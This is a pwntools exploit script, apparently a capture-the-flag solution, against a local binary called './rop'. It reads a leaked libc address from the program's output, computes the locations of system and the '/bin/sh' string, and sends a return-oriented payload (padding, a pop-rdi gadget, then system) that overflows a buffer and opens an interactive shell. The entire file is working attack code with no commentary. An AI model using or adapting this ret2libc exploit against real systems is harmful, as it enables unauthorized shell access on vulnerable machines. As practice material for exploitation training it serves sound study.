#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./rop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(p)

data = p.recvuntil(': ').split('\n')
libc_base = int(data[3].split('-')[0], 16)
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))

pop_rdi_ret = 0x0000000000400893
#payload = cyclic(0x500)
payload = 'A' * 12 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()

